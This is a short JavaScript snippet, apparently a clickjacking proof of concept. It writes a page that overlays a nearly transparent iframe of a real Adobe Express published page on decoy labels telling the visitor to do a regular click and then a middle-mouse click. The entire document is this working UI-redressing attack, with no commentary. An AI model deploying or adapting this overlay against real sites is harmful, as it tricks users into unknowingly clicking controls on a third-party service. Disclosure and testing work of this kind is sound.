document.open();
document.write(`
    <style>
        iframe {
            position: relative;
            width: 1700px;
            height: 900px;
            opacity: 0.1;
            z-index: 2;
        }
        div {
            position: absolute;
            top: 375px;
            left: 800px;
            z-index: 1;
        }
        .blabla {
            position: absolute;
            top: 400px;
            left: 800px;
            z-index: 1;
        }
    </style>
    <div>Second, Middle-Mouse-Click</div>
    <div class="blabla">First, Regular click</div>
    <iframe src="https://new.express.adobe.com/publishedV2/urn:aaid:sc:AP:14c3b7df-de99-4e81-858c-142e1fb72e75?category=search"></iframe>
`);
document.close();